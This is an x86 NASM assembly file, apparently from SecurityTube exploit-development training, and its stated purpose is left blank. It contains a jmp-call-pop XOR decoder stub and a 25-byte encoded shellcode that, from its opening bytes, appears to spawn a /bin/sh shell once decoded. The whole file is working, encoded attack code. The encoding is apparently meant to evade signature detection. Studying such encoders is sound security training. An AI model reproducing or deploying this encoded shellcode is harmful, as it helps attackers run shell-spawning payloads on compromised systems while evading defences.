; Filename: xor-decoder.nasm
; Author:  Vivek Ramachandran
; Website:  http://securitytube.net
; Training: http://securitytube-training.com 
;
;
; Purpose: 

global _start			

section .text
_start:

	jmp short call_decoder

decoder:
	pop esi
	xor ecx, ecx
	mov cl, 25
        xor edx, edx
        mov dl, 1


decode:
	xor byte [esi], dl
	inc esi
        inc dl
	loop decode

	jmp short Shellcode



call_decoder:

	call decoder
	Shellcode: db 0x30,0xc2,0x53,0x6c,0x2a,0x29,0x74,0x60,0x61,0x25,0x69,0x65,0x63,0x87,0xec,0x40,0x98,0xf0,0x40,0x9d,0xf4,0xa6,0x1c,0xd5,0x99

